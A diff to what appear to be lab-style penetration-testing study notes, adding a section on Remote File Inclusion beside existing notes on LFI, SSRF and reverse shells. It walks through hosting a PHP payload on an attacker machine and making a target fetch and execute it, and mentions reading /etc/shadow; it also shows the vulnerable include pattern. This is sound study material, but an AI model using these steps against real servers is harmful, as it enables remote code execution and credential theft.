@@ -122,6 +122,29 @@ Why this is powerful
 You now have remote code execution. You can change `cmd=whoam` to `cmd=id`, `cmd=cat /etc/shadow`, or even use it to spawn a reverse shell. All because the server executed a file it included, rather than just reading it.
 That's the key — a normal path traversal would show you the raw log file text including the `<?php ... ?>` as plain text. But with LFI, the server treats it as code and runs it.
 
+# RFI
+RFI is when you trick the server into including and executing a file from YOUR server. Remember LFI? In LFI, the file is already on the target. In RFI, the file is on your machine and the target fetches it and executes it.
+
+`Think of LFI like this — you trick someone into reading a dangerous book that's already in their own library.`
+`RFI is different — you trick someone into going to your house, picking up a dangerous book you wrote, bringing it back, and reading it out loud. When they read it, the instructions in the book execute.`
+
+## Why does RFI happen?
+Same reason as LFI. Bad PHP code that includes files based on user input: `<?php include($_GET['page']); ?>`
+The URL normally looks like: `http://target.com/index.php?page=about.php`
+The server includes `about.php` from its local directory. But if the PHP config has `allow_url_include = On`, the server can also include files from `external URLs`. That's where RFI becomes possible.
+
+### Example 1 — Basic RFI
+Step 1 — You create a malicious file on your Kali machine
+- Create a file called evil.php: `<?php system("whoami"); ?>`
+Step 2 — You host it on your Kali
+- `python3 -m http.server 8080` -> Now your file is accessible at `http://10.10.14.8:8080/evil.php`
+Step 3 — You make the target include your file
+- `http://target.com/index.php?page=http://10.10.14.8:8080/evil.php`
+What happens internally:
+- The server sees page=http://10.10.14.8:8080/evil.php. It goes to your Kali, fetches evil.php, brings it back, and executes it as PHP code. system("whoami") runs on the target server and you see the output like www-data.
+- On your Python server terminal, you'll see: `10.10.10.50 - - "GET /evil.php HTTP/1.1" 200 -`
+That's the target coming to your machine and downloading your file.
+
 ---
 # What is SSRF?
 `SSRF is when you trick the server into making HTTP requests on your behalf`. Instead of you directly accessing something, you make the server do it for you. This is dangerous because the server often has access to internal resources that you can't reach from the outside.
@@ -308,6 +331,7 @@ You're calling that phone. The target picks up and gives you a bash shell.
 
 >[!Important]
 > Bind shell = Target says "come to me" | Reverse shell = Target says "I'll come to you"
+
 
 
 `Think of it this way: XXE abuses a parser, SSRF abuses a fetcher, Path Traversal abuses a file reader, LFI abuses a file executor (locally), and RFI abuses a file executor (remotely).`
